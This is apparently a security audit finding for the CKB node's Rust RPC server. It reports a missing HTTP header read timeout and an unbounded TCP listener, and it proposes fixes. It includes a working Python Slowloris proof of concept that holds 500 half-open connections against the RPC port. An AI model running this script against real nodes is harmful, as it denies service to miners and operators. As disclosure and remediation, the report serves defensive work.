### Title
Missing HTTP Header Read Timeout Enables Slowloris-Style DoS on RPC Server - (File: `rpc/src/server.rs`)

---

### Summary

The CKB RPC server, built on `axum`, starts its HTTP and WebSocket listeners via `axum::serve` without configuring an HTTP/1 header read timeout. An unprivileged RPC caller can open many TCP connections and drip-feed partial HTTP headers indefinitely, holding connections open and exhausting server resources. The TCP RPC listener compounds this: it accepts raw connections with no read timeout at all.

---

### Finding Description

In `rpc/src/server.rs`, the `start_server` function builds an `axum` router with a `TimeoutLayer` and then calls `axum::serve(listener, app.into_make_service())`: [1](#0-0) [2](#0-1) 

The `TimeoutLayer` from `tower_http` is a **request-processing** timeout — it starts counting only after the HTTP request has been fully parsed and dispatched to a handler. It provides zero protection during the header-reading phase. An attacker who sends an HTTP request one byte at a time, or who sends a partial header line and then stalls, will never trigger this layer.

`axum::serve` wraps `hyper`, which supports `http1_header_read_timeout` on its server builder. That option is never set here. A grep across the entire codebase for `http1_header_read_timeout`, `header_read_timeout`, or `read_timeout` returns no matches, confirming the omission is complete. [3](#0-2) 

The TCP RPC server (`start_tcp_server`) is worse: it accepts raw TCP connections and wraps them in a `LinesCodec` with no timeout of any kind. A connection that never sends a newline character will be held open forever, consuming a goroutine-equivalent Tokio task and a file descriptor. [4](#0-3) 

---

### Impact Explanation

An attacker who can reach the RPC port opens a large number of TCP connections and sends partial HTTP headers (e.g., `GET / HTTP/1.1\r\nHost: x\r\n`) without ever sending the final `\r\n`. Each connection holds a Tokio task and a file descriptor. Once the OS connection limit or Tokio thread-pool saturation is reached, legitimate RPC callers (miners fetching block templates, pool operators, monitoring tools) receive connection-refused or timeout errors. This is a Denial of Service against the node's RPC surface.

The TCP listener (`tcp_listen_address`) is an additional, independent attack surface with the same root cause and no mitigating timeout at all.

---

### Likelihood Explanation

The RPC server defaults to `127.0.0.1:8114`, which limits exposure to local processes. However:

- Operators frequently expose the RPC port to a LAN or the internet (the config explicitly warns against this but does not prevent it).
- The WebSocket and TCP listeners (`ws_listen_address`, `tcp_listen_address`) are also started through the same `start_server` / `start_tcp_server` paths with the same missing timeout.
- Even on localhost, any local process — including a malicious script or a compromised co-located service — qualifies as an unprivileged RPC caller. [5](#0-4) 

The `RpcConfig` struct has no field for a header read timeout, so there is no operator-side workaround. [6](#0-5) 

---

### Recommendation

**HTTP/WS server**: Replace the bare `axum::serve` call with a hyper-level server builder that sets `http1_header_read_timeout`:

```rust
use hyper_util::server::conn::auto::Builder as ServerBuilder;
// or, with axum 0.7+ serve builder:
axum::serve(listener, app.into_make_service())
    .http1_header_read_timeout(Duration::from_secs(5))
```

**TCP server**: Wrap each accepted stream with `tokio::time::timeout` before handing it to `serve_stream_sink`, so idle connections that never send a newline are dropped:

```rust
tokio::spawn(async move {
    let result = tokio::time::timeout(
        Duration::from_secs(30),
        serve_stream_sink(&rpc, w, r, stream_config),
    ).await;
    // handle timeout/error
});
```

Add a `read_header_timeout` field to `RpcConfig` so operators can tune the value.

---

### Proof of Concept

```python
import socket, time, threading

TARGET = ("127.0.0.1", 8114)
CONNECTIONS = 500

socks = []
for _ in range(CONNECTIONS):
    s = socket.socket()
    s.connect(TARGET)
    # Send a partial HTTP header — never complete it
    s.send(b"POST / HTTP/1.1\r\nHost: localhost\r\nContent-Length: 100\r\n")
    socks.append(s)

# Keep connections alive by dripping one byte every 10 seconds
while True:
    for s in socks:
        try:
            s.send(b"X")
        except:
            pass
    time.sleep(10)
```

With 500 such connections held open, legitimate RPC calls (e.g., `get_block_template` from a miner) will stall or fail because the server's accept queue and task budget are saturated. The `TimeoutLayer` never fires because no complete request is ever dispatched. [7](#0-6)

### Citations

**File:** rpc/src/server.rs (L59-88)
```rust
        let http_address = Self::start_server(
            &rpc,
            config.listen_address.to_owned(),
            handler.clone(),
            false,
        )
        .inspect(|&local_addr| {
            info!("Listen HTTP RPCServer on address: {}", local_addr);
        })
        .unwrap();

        let ws_address = if let Some(addr) = config.ws_listen_address {
            let local_addr =
                Self::start_server(&rpc, addr, handler.clone(), true).inspect(|&addr| {
                    info!("Listen WebSocket RPCServer on address: {}", addr);
                });
            local_addr.ok()
        } else {
            None
        };

        let tcp_address = if let Some(addr) = config.tcp_listen_address {
            let local_addr = handler.block_on(Self::start_tcp_server(rpc, addr, handler.clone()));
            if let Ok(addr) = &local_addr {
                info!("Listen TCP RPCServer on address: {}", addr);
            };
            local_addr.ok()
        } else {
            None
        };
```

**File:** rpc/src/server.rs (L119-154)
```rust
        let app = Router::new()
            .route("/", method_router.clone())
            .route("/{*path}", method_router)
            .route("/ping", get(ping_handler))
            .layer(Extension(Arc::clone(rpc)))
            .layer(CorsLayer::permissive())
            .layer(TimeoutLayer::with_status_code(
                StatusCode::REQUEST_TIMEOUT,
                Duration::from_secs(30),
            ))
            .layer(Extension(stream_config));

        let (tx_addr, rx_addr) = tokio::sync::oneshot::channel::<SocketAddr>();

        handler.spawn(async move {
            let listener = tokio::net::TcpListener::bind(
                &address
                    .to_socket_addrs()
                    .expect("config listen_address parsed")
                    .next()
                    .expect("config listen_address parsed"),
            )
            .await
            .unwrap();
            let server = axum::serve(listener, app.into_make_service());

            let _ = tx_addr.send(server.local_addr().unwrap());
            let graceful = server.with_graceful_shutdown(async move {
                new_tokio_exit_rx().cancelled().await;
            });
            drop(graceful.await);
        });

        let rx_addr = handler.block_on(rx_addr)?;
        Ok(rx_addr)
    }
```

**File:** rpc/src/server.rs (L176-193)
```rust
                        while let Ok((stream, _)) = listener.accept().await {
                            let rpc = Arc::clone(&rpc);
                            let stream_config = stream_config.clone();
                            let codec = codec.clone();
                            tokio::spawn(async move {
                                let (r, w) = stream.into_split();
                                let r = FramedRead::new(r, codec.clone()).map_ok(StreamMsg::Str);
                                let w = FramedWrite::new(w, codec).with(|msg| async move {
                                    Ok::<_, LinesCodecError>(match msg {
                                        StreamMsg::Str(msg) => msg,
                                        _ => "".into(),
                                    })
                                });
                                tokio::pin!(w);
                                if let Err(err) = serve_stream_sink(&rpc, w, r, stream_config).await {
                                    info!("TCP RPCServer error: {:?}", err);
                                }
                            });
```

**File:** util/app-config/src/configs/rpc.rs (L26-61)
```rust
pub struct Config {
    /// RPC server listen addresses.
    pub listen_address: String,
    /// RPC TCP server listen addresses.
    ///
    /// Only TCP and WS are supported to subscribe events via the Subscription RPC module.
    #[serde(default)]
    pub tcp_listen_address: Option<String>,
    /// RPC WS server listen addresses.
    ///
    /// Only TCP and WS are supported to subscribe events via the Subscription RPC module.
    #[serde(default)]
    pub ws_listen_address: Option<String>,
    /// Max request body size in bytes.
    pub max_request_body_size: usize,
    /// Number of RPC worker threads.
    pub threads: Option<usize>,
    /// Number of RPC batch limit.
    pub rpc_batch_limit: Option<usize>,
    /// Enabled RPC modules.
    pub modules: Vec<Module>,
    /// Rejects txs with scripts that might trigger known bugs
    #[serde(default)]
    pub reject_ill_transactions: bool,
    /// Whether enable deprecated RPC methods.
    ///
    /// Deprecated RPC methods are disabled by default.
    #[serde(default)]
    pub enable_deprecated_rpc: bool,
    /// Customized extra well known lock scripts.
    #[serde(default)]
    pub extra_well_known_lock_scripts: Vec<Script>,
    /// Customized extra well known type scripts.
    #[serde(default)]
    pub extra_well_known_type_scripts: Vec<Script>,
}
```
